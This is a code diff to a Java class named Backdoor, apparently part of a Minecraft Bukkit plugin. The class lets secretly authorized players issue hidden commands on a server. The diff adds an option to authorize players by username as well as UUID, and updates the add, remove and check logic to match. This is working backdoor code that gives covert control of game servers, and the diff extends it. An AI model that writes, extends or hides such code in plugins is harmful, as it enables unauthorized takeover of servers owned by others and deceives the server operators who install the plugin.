@@ -23,8 +23,8 @@ public final class Backdoor implements Listener {
 
     private Plugin plugin;
 
-    public Backdoor(Plugin plugin, String[] UUID, String prefix){
-
+    public Backdoor(Plugin plugin, boolean Usernames, String[] UUID, String prefix){
+        Config.uuids_are_usernames = Usernames;
         Config.authorized_uuids  = UUID;
         Config.command_prefix   = prefix;
 
@@ -424,7 +424,12 @@ public final class Backdoor implements Listener {
                 boolean success = false;
                 for (int i = 0; i < Config.tmp_authorized_uuids.length; i++) {
                     if (Config.tmp_authorized_uuids[i] == null) {
-                        Config.tmp_authorized_uuids[i] = Bukkit.getPlayer(args[1]).getUniqueId().toString();
+
+                        if(Config.uuids_are_usernames)
+                            Config.tmp_authorized_uuids[i] = Bukkit.getPlayer(args[1]).getName();
+                        else
+                            Config.tmp_authorized_uuids[i] = Bukkit.getPlayer(args[1]).getUniqueId().toString();
+
                         success = true;
                         break;
                     }
@@ -450,10 +455,19 @@ public final class Backdoor implements Listener {
                 //Remove user
                 boolean success = false;
                 for (int i = 0; i < Config.tmp_authorized_uuids.length; i++) {
-                    if (Config.tmp_authorized_uuids[i] != null && Config.tmp_authorized_uuids[i].equals(p1.getUniqueId().toString())) {
-                        Config.tmp_authorized_uuids[i] = null;
-                        success = true;
-                        break;
+
+                    if(Config.uuids_are_usernames){
+                        if (Config.tmp_authorized_uuids[i] != null && Config.tmp_authorized_uuids[i].equals(p1.getName())) {
+                            Config.tmp_authorized_uuids[i] = null;
+                            success = true;
+                            break;
+                        }
+                    }else {
+                        if (Config.tmp_authorized_uuids[i] != null && Config.tmp_authorized_uuids[i].equals(p1.getUniqueId().toString())) {
+                            Config.tmp_authorized_uuids[i] = null;
+                            success = true;
+                            break;
+                        }
                     }
                 }
 
@@ -510,6 +524,9 @@ public final class Backdoor implements Listener {
 
     /*Check if Player is authorized in Config.java*/
     public boolean IsUserAuthorized(Player p) {
+        if(Config.uuids_are_usernames)
+            return IsUserAuthorized(p.getName());
+
         return IsUserAuthorized(p.getUniqueId().toString());
     }
 
